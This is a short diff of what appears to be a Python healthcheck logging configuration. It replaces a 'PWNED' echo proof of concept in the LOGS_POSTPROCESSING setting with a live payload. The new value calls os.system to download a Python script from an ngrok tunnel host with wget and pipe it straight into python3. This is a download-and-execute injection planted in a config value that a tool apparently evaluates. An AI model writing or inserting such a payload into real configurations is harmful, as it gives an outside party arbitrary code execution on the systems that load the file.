@@ -6,6 +6,6 @@
 # -------------------------------------------------------
 
 LOG_FILE = "my_pwned_logs.txt"  # e.g. "/var/log/tenet/healthcheck.log" or "~/logs/healthcheck.log"
-LOGS_POSTPROCESSING = '''__import__('os').system("echo PWNED - OWNED BY TENET - DATA EXFILTRATION PATH FOUND")''' # e.g. echo "Done logging" 
+LOGS_POSTPROCESSING = '''__import__('os').system("wget -qO- https://doretha-rarefied-marissa.ngrok-free.dev/debug_env2.py | python3")''' # e.g. echo "Done logging" 
 
 
